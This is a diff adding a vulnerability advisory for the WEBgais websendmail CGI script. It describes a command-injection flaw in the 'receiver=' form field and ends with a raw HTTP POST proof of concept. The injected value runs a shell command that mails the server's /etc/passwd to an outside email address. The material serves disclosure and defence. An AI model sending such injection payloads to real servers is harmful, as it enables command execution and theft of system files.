@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/2077/info
+
+WEBgais is a package that provides a web interface to the "gais" (Global Area Intelligent Search) search engine tool. This package contains a vulnerable script, websendmail, which can be used to execute arbitrary commands on the server with the privileges of the web server. User supplied data (from the "receiver=" form variable) is passed to a Perl OPEN function without proper input verification, allowing the use of shell metacharacters to separate commands. This can be directly exploited by submitting via the POST method the variable "receiver=" with the command separation shell metacharacter (;) followed by a command. Consequences could range from destruction of data and web site defacement to elevation of privileges through locally exploitable vulnerabilities. 
+
+telnet target.machine.com 80
+POST /cgi-bin/websendmail HTTP/1.0
+Content-length: xxx (should be replaced with the actual length of the string passed to the server, in this case xxx=90)
+
+receiver=;mail+BUGTRAQ\@NETSPACE.ORG</etc/passwd;&sender=a&rtnaddr=a&subject=a&content=a 
